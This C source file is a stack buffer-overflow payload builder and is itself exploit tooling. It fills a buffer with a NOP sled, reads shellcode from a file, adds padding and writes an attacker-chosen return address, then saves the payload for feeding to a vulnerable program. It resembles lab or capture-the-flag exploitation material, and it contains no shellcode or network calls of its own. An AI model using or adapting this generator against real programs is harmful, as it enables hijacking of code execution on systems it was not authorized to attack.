#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>

#define BUF_SIZE 512
int main (int argc, const char* argv[])
{
	if (argc < 5)
	{
		fprintf(stderr, "./prog assumed_shellcode_addr padding shellcode outputfile\n");
		return -1;
	}
	char* buff = (char*)malloc(BUF_SIZE);
	memset(buff, 0x90, BUF_SIZE);
	int bad_fd = open(argv[3], O_RDONLY);
	if (bad_fd < 0)
		goto clean1;
	int r = read(bad_fd, buff, BUF_SIZE);
	unsigned long return_addr = strtoul(argv[1], NULL, 16);
	unsigned int padding_length = (unsigned int)strtoul(argv[2],NULL,16);
	memcpy(buff+r+padding_length, &return_addr, sizeof(unsigned long));

	int output_fd = open(argv[4], O_WRONLY | O_CREAT | O_TRUNC);
	if (output_fd < 0)
		goto clean2;
	write(output_fd, buff, r + 8 + padding_length /*BUF_SIZE*/);

	close(output_fd);
	clean2:
	close(bad_fd);
	clean1:
	free(buff);
	return 0;
}
